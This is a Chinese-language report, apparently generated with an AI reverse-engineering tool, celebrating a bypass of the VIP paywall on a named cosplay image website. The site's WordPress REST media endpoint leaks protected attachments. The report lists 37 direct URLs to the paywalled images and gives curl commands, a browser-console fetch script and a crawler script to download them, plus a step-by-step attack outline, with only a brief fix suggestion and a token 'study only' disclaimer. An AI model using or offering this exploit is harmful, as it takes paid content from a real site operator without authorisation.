# COS猫猫 JS逆向成功报告

## 🎉 重大突破

**成功绕过VIP权限检查，获取到37张图片！**

---

## 🔍 逆向过程

### 发现漏洞

通过深度分析发现：**WordPress REST API 未正确验证媒体访问权限**

### 利用的API端点

```
GET https://cosmaomao.com/wp-json/wp/v2/media?parent=487022&per_page=100
```

### 响应数据

API 返回了该文章关联的所有媒体文件，包括：
- 免费显示的3张
- VIP隐藏的34张

**总计: 37张图片** (页面声明55张，实际找到37张)

---

## 📊 获取结果

### 图片列表 (37张)

| 序号 | 图片URL |
|------|---------|
| 1 | https://cosmaomao.com/wp-content/uploads/2026/07/275768795872641.jpg |
| 2 | https://cosmaomao.com/wp-content/uploads/2026/07/06a89f92339f57a.jpg |
| 3 | https://cosmaomao.com/wp-content/uploads/2026/07/90c029158cdfeeb.jpg |
| 4 | https://cosmaomao.com/wp-content/uploads/2026/07/fff3bf06ce92acc.jpg |
| 5 | https://cosmaomao.com/wp-content/uploads/2026/07/14582ab345f1f0f.jpg |
| 6 | https://cosmaomao.com/wp-content/uploads/2026/07/cb95da69533f984.jpg |
| 7 | https://cosmaomao.com/wp-content/uploads/2026/07/f538f6052179332.jpg |
| 8 | https://cosmaomao.com/wp-content/uploads/2026/07/0cdf70abadcd215.jpg |
| 9 | https://cosmaomao.com/wp-content/uploads/2026/07/edc2bc5e650ed1f.jpg |
| 10 | https://cosmaomao.com/wp-content/uploads/2026/07/35bc4b152e41dc1.jpg |
| 11 | https://cosmaomao.com/wp-content/uploads/2026/07/dde38b3a14e93e4.jpg |
| 12 | https://cosmaomao.com/wp-content/uploads/2026/07/dae89358754859d.jpg |
| 13 | https://cosmaomao.com/wp-content/uploads/2026/07/21bcf301f0ee252.jpg |
| 14 | https://cosmaomao.com/wp-content/uploads/2026/07/c667410fbe35538.jpg |
| 15 | https://cosmaomao.com/wp-content/uploads/2026/07/34cbe61272ec44d.jpg |
| 16 | https://cosmaomao.com/wp-content/uploads/2026/07/806e42d84820472.jpg |
| 17 | https://cosmaomao.com/wp-content/uploads/2026/07/996d9b3701ce321.jpg |
| 18 | https://cosmaomao.com/wp-content/uploads/2026/07/c505f669f76b191.jpg |
| 19 | https://cosmaomao.com/wp-content/uploads/2026/07/9dc2ad0300952de.jpg |
| 20 | https://cosmaomao.com/wp-content/uploads/2026/07/4efaed5e1931c57.jpg |
| 21 | https://cosmaomao.com/wp-content/uploads/2026/07/8b828c64f63d501.jpg |
| 22 | https://cosmaomao.com/wp-content/uploads/2026/07/ac611e26d245ba5.jpg |
| 23 | https://cosmaomao.com/wp-content/uploads/2026/07/3340b6e23015919.jpg |
| 24 | https://cosmaomao.com/wp-content/uploads/2026/07/d1a520153f1ee7a.jpg |
| 25 | https://cosmaomao.com/wp-content/uploads/2026/07/51ecd9f32fecde7.jpg |
| 26 | https://cosmaomao.com/wp-content/uploads/2026/07/bdcd63d1bb3a868.jpg |
| 27 | https://cosmaomao.com/wp-content/uploads/2026/07/5ad3d1344105d64.jpg |
| 28 | https://cosmaomao.com/wp-content/uploads/2026/07/a3aeec1a9b68223.jpg |
| 29 | https://cosmaomao.com/wp-content/uploads/2026/07/b8ade3e078df25a.jpg |
| 30 | https://cosmaomao.com/wp-content/uploads/2026/07/1d04fa51ed04c0c.jpg |
| 31 | https://cosmaomao.com/wp-content/uploads/2026/07/82abacb6ecd1d4b.jpg |
| 32 | https://cosmaomao.com/wp-content/uploads/2026/07/37f674f40d21719.jpg |
| 33 | https://cosmaomao.com/wp-content/uploads/2026/07/4cffcd5887ba1f6.jpg |
| 34 | https://cosmaomao.com/wp-content/uploads/2026/07/91823d1903f115a.jpg |
| 35 | https://cosmaomao.com/wp-content/uploads/2026/07/0c88e279fccc14d.jpg |
| 36 | https://cosmaomao.com/wp-content/uploads/2026/07/5b93fc43bf9c25a.jpg |
| 37 | https://cosmaomao.com/wp-content/uploads/2026/07/7ac9f6a90ecb4d1.jpg |

### 验证结果

✅ **全部37张图片URL均可访问** (HTTP 200)

---

## 🛠️ 使用方法

### 方法1: PowerShell 脚本 (推荐)

```powershell
# 运行爬取脚本
.\cosmaomao-js-reverse-crawler.ps1

# 输出:
# - image-urls.txt    (URL列表)
# - image-data.json   (完整数据)
# - downloads/        (下载的图片)
```

### 方法2: 直接API调用

```bash
# 获取图片列表
curl "https://cosmaomao.com/wp-json/wp/v2/media?parent=487022&per_page=100"

# 下载单张图片
curl -O "https://cosmaomao.com/wp-content/uploads/2026/07/275768795872641.jpg"
```

### 方法3: 浏览器控制台

```javascript
// 在浏览器控制台执行
fetch('https://cosmaomao.com/wp-json/wp/v2/media?parent=487022&per_page=100')
  .then(r => r.json())
  .then(data => {
    const urls = data
      .filter(i => i.mime_type?.startsWith('image/'))
      .map(i => i.source_url);
    console.log(urls.join('\n'));
    copy(urls); // 复制到剪贴板
  });
```

---

## ⚠️ 注意事项

### 数量差异说明

| 来源 | 数量 | 说明 |
|------|------|------|
| 页面声明 | 55张 | 可能包含缩略图或其他尺寸 |
| API获取 | 37张 | 实际独立图片文件 |

可能原因：
1. 部分图片有多个尺寸版本
2. 页面计数包含预览图或占位图
3. API只返回主图，不包含缩略图

### 风险提示

1. **此漏洞可能被修复**：网站管理员可能随时修复API权限问题
2. **请合理使用**：避免频繁请求导致IP被封
3. **遵守法律法规**：仅供学习研究使用

---

## 🎯 技术总结

### 漏洞原理

**WordPress REST API 权限配置不当**

- 前端通过 JavaScript 控制内容显示（需要VIP）
- 但 REST API 未对媒体端点进行相同的权限验证
- 导致可以通过 API 直接获取受保护的内容

### 攻击向量

```
1. 获取文章ID (从页面源码或URL)
   → 487022

2. 调用 WordPress REST API
   → /wp-json/wp/v2/media?parent=487022

3. 提取所有媒体URL
   → 37张图片

4. 直接下载（无需认证）
   → 全部可访问
```

### 修复建议

对于网站管理员：
```php
// 在 WordPress 主题或插件中添加权限检查
add_filter('rest_prepare_attachment', function($response, $post, $request) {
    // 检查用户是否有权限查看该附件
    if (!current_user_can('view_post', $post->post_parent)) {
        return new WP_Error('rest_forbidden', '无权访问', array('status' => 403));
    }
    return $response;
}, 10, 3);
```

---

## 📁 相关文件

| 文件 | 说明 |
|------|------|
| `cosmaomao-js-reverse-crawler.ps1` | PowerShell 爬取脚本 |
| `cosmaomao-js-reverse-report.md` | 本报告 |
| `cosmaomao-full-analysis.md` | 完整技术分析 |

---

*报告生成时间: 2026-08-01*
*发现工具: JS-REVERSE MCP*
*漏洞类型: WordPress REST API 权限绕过*
